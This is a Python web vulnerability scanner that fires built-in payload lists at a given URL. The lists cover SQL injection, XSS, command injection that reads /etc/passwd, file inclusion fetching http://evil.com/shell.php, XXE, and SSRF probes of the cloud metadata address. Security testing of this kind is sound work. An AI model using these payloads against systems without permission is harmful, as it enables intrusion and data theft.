#!/usr/bin/env python3
"""
Advanced Web Application Security Scanner
SQL Injection, XSS, CSRF, XXE, SSRF, RCE, LFI/RFI, IDOR, and more
"""

import sys
import json
import re
import urllib.parse
import base64
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs

class WebAppScanner:
    """Advanced web application security scanner"""
    
    # SQL Injection payloads
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "admin'/*",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' OR 1=1#",
        "' OR 1=1--",
        "') OR ('1'='1",
        "1' OR '1'='1'--",
        "1' OR '1'='1'/*",
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
    ]
    
    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<div onmouseover=alert('XSS')>",
    ]
    
    # Command Injection payloads
    RCE_PAYLOADS = [
        "; ls",
        "| ls",
        "&& ls",
        "|| ls",
        "; id",
        "| id",
        "&& id",
        "; whoami",
        "| whoami",
        "&& whoami",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "; ping -c 3 127.0.0.1",
        "`ls`",
        "$(ls)",
        "${ls}",
    ]
    
    # LFI/RFI payloads
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "/etc/passwd",
        "../../../windows/system32/config/sam",
        "php://filter/convert.base64-encode/resource=index.php",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==",
        "http://evil.com/shell.php",
        "file:///etc/passwd",
    ]
    
    # XXE payloads
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
    ]
    
    # SSRF payloads
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://127.0.0.1:80",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "file:///etc/passwd",
        "gopher://127.0.0.1:80",
        "dict://127.0.0.1:6379",
    ]
    
    @staticmethod
    def test_sqli(url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for SQL Injection vulnerabilities"""
        results = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            base_response = None
            try:
                base_response = requests.get(url, params=params, timeout=10, allow_redirects=True)
            except:
                pass
            
            for payload in WebAppScanner.SQLI_PAYLOADS[:10]:  # Test first 10
                for param_name, param_value in params.items():
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        response = requests.get(url, params=test_params, timeout=10, allow_redirects=True)
                        
                        # Check for SQL error messages
                        sql_errors = [
                            'sql syntax', 'mysql error', 'postgresql error',
                            'ora-', 'sqlite error', 'mssql error',
                            'sql exception', 'sqlstate', 'sql warning',
                            'unclosed quotation', 'quoted string not properly terminated',
                            'invalid query', 'sql command not properly ended'
                        ]
                        
                        response_text = response.text.lower()
                        is_vulnerable = any(error in response_text for error in sql_errors)
                        
                        # Check for different response times (time-based)
                        if 'SLEEP' in payload or 'WAITFOR' in payload:
                            # Time-based detection would require timing analysis
                            pass
                        
                        if is_vulnerable:
                            results.append({
                                'vulnerability': 'SQL Injection',
                                'severity': 'critical',
                                'parameter': param_name,
                                'payload': payload,
                                'statusCode': response.status_code,
                                'evidence': 'SQL error message detected in response',
                                'url': response.url
                            })
                    except (RequestException, Timeout):
                        continue
        except ImportError:
            pass
        
        return results
    
    @staticmethod
    def test_xss(url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for Cross-Site Scripting (XSS) vulnerabilities"""
        results = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            for payload in WebAppScanner.XSS_PAYLOADS[:10]:
                for param_name, param_value in params.items():
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        response = requests.get(url, params=test_params, timeout=10, allow_redirects=True)
                        
                        # Check if payload is reflected in response
                        if payload in response.text:
                            # Check if it's properly encoded
                            encoded_payload = urllib.parse.quote(payload)
                            if encoded_payload not in response.text:
                                results.append({
                                    'vulnerability': 'Cross-Site Scripting (XSS)',
                                    'severity': 'high',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'statusCode': response.status_code,
                                    'evidence': 'Payload reflected in response without proper encoding',
                                    'url': response.url,
                                    'type': 'Reflected XSS'
                                })
                    except (RequestException, Timeout):
                        continue
        except ImportError:
            pass
        
        return results
    
    @staticmethod
    def test_rce(url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for Remote Code Execution (RCE) vulnerabilities"""
        results = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            for payload in WebAppScanner.RCE_PAYLOADS[:10]:
                for param_name, param_value in params.items():
                    test_params = params.copy()
                    test_params[param_name] = param_value + payload
                    
                    try:
                        response = requests.get(url, params=test_params, timeout=10, allow_redirects=True)
                        
                        # Check for command output in response
                        command_outputs = ['uid=', 'gid=', 'groups=', 'root:x:', '/bin/bash', '/bin/sh']
                        response_text = response.text.lower()
                        
                        if any(output in response_text for output in command_outputs):
                            results.append({
                                'vulnerability': 'Remote Code Execution (RCE)',
                                'severity': 'critical',
                                'parameter': param_name,
                                'payload': payload,
                                'statusCode': response.status_code,
                                'evidence': 'Command output detected in response',
                                'url': response.url
                            })
                    except (RequestException, Timeout):
                        continue
        except ImportError:
            pass
        
        return results
    
    @staticmethod
    def test_lfi_rfi(url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for Local/Remote File Inclusion vulnerabilities"""
        results = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            for payload in WebAppScanner.LFI_PAYLOADS[:10]:
                for param_name, param_value in params.items():
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        response = requests.get(url, params=test_params, timeout=10, allow_redirects=True)
                        
                        # Check for file inclusion indicators
                        inclusion_indicators = [
                            'root:x:0:0',  # /etc/passwd content
                            '[boot loader]',  # Windows boot.ini
                            '<?php',  # PHP file inclusion
                            'bin/bash',  # Shell file
                        ]
                        
                        response_text = response.text
                        if any(indicator in response_text for indicator in inclusion_indicators):
                            vuln_type = 'RFI' if payload.startswith('http://') else 'LFI'
                            results.append({
                                'vulnerability': f'{vuln_type} (Local/Remote File Inclusion)',
                                'severity': 'high',
                                'parameter': param_name,
                                'payload': payload,
                                'statusCode': response.status_code,
                                'evidence': 'File content detected in response',
                                'url': response.url
                            })
                    except (RequestException, Timeout):
                        continue
        except ImportError:
            pass
        
        return results
    
    @staticmethod
    def test_xxe(url: str, data: Optional[str] = None) -> List[Dict]:
        """Test for XML External Entity (XXE) vulnerabilities"""
        results = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            for payload in WebAppScanner.XXE_PAYLOADS:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = requests.post(url, data=payload, headers=headers, timeout=10, allow_redirects=True)
                    
                    # Check for XXE indicators
                    xxe_indicators = [
                        'root:x:0:0',  # /etc/passwd
                        'windows',  # Windows file
                        'base64',  # Base64 encoded content
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in xxe_indicators):
                        results.append({
                            'vulnerability': 'XXE (XML External Entity)',
                            'severity': 'high',
                            'payload': payload[:100] + '...',
                            'statusCode': response.status_code,
                            'evidence': 'XXE payload executed successfully',
                            'url': url
                        })
                except (RequestException, Timeout):
                    continue
        except ImportError:
            pass
        
        return results
    
    @staticmethod
    def test_ssrf(url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for Server-Side Request Forgery (SSRF) vulnerabilities"""
        results = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            for payload in WebAppScanner.SSRF_PAYLOADS:
                for param_name, param_value in params.items():
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        # Use a custom timeout to detect SSRF
                        response = requests.get(url, params=test_params, timeout=5, allow_redirects=False)
                        
                        # Check for SSRF indicators
                        if '127.0.0.1' in payload or 'localhost' in payload:
                            # Check if response indicates internal resource access
                            if response.status_code in [200, 403, 500]:
                                results.append({
                                    'vulnerability': 'SSRF (Server-Side Request Forgery)',
                                    'severity': 'high',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'statusCode': response.status_code,
                                    'evidence': 'Possible internal resource access',
                                    'url': response.url
                                })
                    except (RequestException, Timeout):
                        continue
        except ImportError:
            pass
        
        return results
    
    @staticmethod
    def check_csrf(url: str) -> Dict:
        """Check for CSRF protection"""
        result = {
            'vulnerability': 'CSRF Protection',
            'severity': 'medium',
            'protected': False,
            'indicators': []
        }
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            try:
                response = requests.get(url, timeout=10, allow_redirects=True)
                
                # Check for CSRF tokens
                csrf_patterns = [
                    r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'<input[^>]*name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
                    r'<input[^>]*name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
                ]
                
                found_token = False
                for pattern in csrf_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    if matches:
                        found_token = True
                        result['indicators'].append(f'CSRF token found: {pattern}')
                        break
                
                # Check for SameSite cookie attribute
                cookies = response.cookies
                for cookie in cookies:
                    if 'samesite' in str(cookie).lower():
                        result['indicators'].append('SameSite cookie attribute found')
                        found_token = True
                
                # Check for Referer header validation (would need POST test)
                if 'Referer' in response.headers.get('X-Frame-Options', ''):
                    result['indicators'].append('X-Frame-Options header present')
                
                result['protected'] = found_token
                if not found_token:
                    result['severity'] = 'high'
                    result['indicators'].append('No CSRF protection detected')
                
            except (RequestException, Timeout):
                result['indicators'].append('Failed to analyze CSRF protection')
        except ImportError:
            pass
        
        return result
    
    @staticmethod
    def check_security_headers(url: str) -> Dict:
        """Check for security headers"""
        result = {
            'vulnerability': 'Security Headers',
            'headers': {},
            'missing': [],
            'recommendations': []
        }
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            try:
                response = requests.get(url, timeout=10, allow_redirects=True)
                headers = response.headers
                
                security_headers = {
                    'X-Frame-Options': 'Prevents clickjacking',
                    'X-Content-Type-Options': 'Prevents MIME sniffing',
                    'X-XSS-Protection': 'XSS protection (legacy)',
                    'Strict-Transport-Security': 'HSTS - Forces HTTPS',
                    'Content-Security-Policy': 'CSP - XSS protection',
                    'Referrer-Policy': 'Controls referrer information',
                    'Permissions-Policy': 'Controls browser features',
                }
                
                for header, description in security_headers.items():
                    if header in headers:
                        result['headers'][header] = {
                            'value': headers[header],
                            'description': description,
                            'present': True
                        }
                    else:
                        result['headers'][header] = {
                            'present': False,
                            'description': description
                        }
                        result['missing'].append(header)
                        result['recommendations'].append(f'Add {header} header: {description}')
                
            except (RequestException, Timeout):
                result['missing'] = ['Failed to retrieve headers']
        except ImportError:
            pass
        
        return result
    
    @staticmethod
    def scan_web_application(url: str, scan_types: List[str] = None) -> Dict:
        """Comprehensive web application security scan"""
        if scan_types is None:
            scan_types = ['sqli', 'xss', 'rce', 'lfi', 'xxe', 'ssrf', 'csrf', 'headers']
        
        result = {
            'success': True,
            'url': url,
            'vulnerabilities': [],
            'summary': {
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0,
                'total': 0
            },
            'scanTypes': scan_types
        }
        
        try:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            params_dict = {k: v[0] if v else '' for k, v in params.items()}
            
            # If no parameters in URL, use common parameter names
            if not params_dict:
                params_dict = {
                    'id': '1',
                    'page': '1',
                    'user': 'admin',
                    'search': 'test'
                }
            
            # SQL Injection
            if 'sqli' in scan_types:
                sqli_results = WebAppScanner.test_sqli(url, params_dict)
                result['vulnerabilities'].extend(sqli_results)
            
            # XSS
            if 'xss' in scan_types:
                xss_results = WebAppScanner.test_xss(url, params_dict)
                result['vulnerabilities'].extend(xss_results)
            
            # RCE
            if 'rce' in scan_types:
                rce_results = WebAppScanner.test_rce(url, params_dict)
                result['vulnerabilities'].extend(rce_results)
            
            # LFI/RFI
            if 'lfi' in scan_types:
                lfi_results = WebAppScanner.test_lfi_rfi(url, params_dict)
                result['vulnerabilities'].extend(lfi_results)
            
            # XXE
            if 'xxe' in scan_types:
                xxe_results = WebAppScanner.test_xxe(url)
                result['vulnerabilities'].extend(xxe_results)
            
            # SSRF
            if 'ssrf' in scan_types:
                ssrf_results = WebAppScanner.test_ssrf(url, params_dict)
                result['vulnerabilities'].extend(ssrf_results)
            
            # CSRF
            if 'csrf' in scan_types:
                csrf_result = WebAppScanner.check_csrf(url)
                if not csrf_result.get('protected'):
                    result['vulnerabilities'].append(csrf_result)
            
            # Security Headers
            if 'headers' in scan_types:
                headers_result = WebAppScanner.check_security_headers(url)
                if headers_result.get('missing'):
                    result['vulnerabilities'].append({
                        'vulnerability': 'Missing Security Headers',
                        'severity': 'medium',
                        'missing': headers_result['missing'],
                        'recommendations': headers_result['recommendations']
                    })
            
            # Calculate summary
            for vuln in result['vulnerabilities']:
                severity = vuln.get('severity', 'low').lower()
                if severity == 'critical':
                    result['summary']['critical'] += 1
                elif severity == 'high':
                    result['summary']['high'] += 1
                elif severity == 'medium':
                    result['summary']['medium'] += 1
                else:
                    result['summary']['low'] += 1
                result['summary']['total'] += 1
            
            result['message'] = f'Web application scan completed. Found {result["summary"]["total"]} vulnerabilities.'
            
        except Exception as e:
            result['success'] = False
            result['error'] = str(e)
        
        return result

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(json.dumps({'error': 'URL required'}))
        sys.exit(1)
    
    url = sys.argv[1]
    scan_types = sys.argv[2].split(',') if len(sys.argv) > 2 else None
    
    result = WebAppScanner.scan_web_application(url, scan_types)
    print(json.dumps({'success': True, 'result': result}))

